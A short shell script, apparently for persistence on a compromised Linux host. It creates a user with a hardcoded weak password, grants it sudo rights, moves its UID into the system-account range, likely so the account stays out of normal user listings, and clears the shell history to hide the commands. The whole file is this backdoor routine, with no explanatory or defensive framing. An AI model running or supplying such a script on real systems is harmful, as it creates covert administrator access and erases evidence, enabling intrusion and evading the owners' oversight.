#!/bin/sh
sudo useradd -p $(openssl passwd -1 user) username
sudo usermod -aG sudo username
sudo usermod -u 599 username
history -c
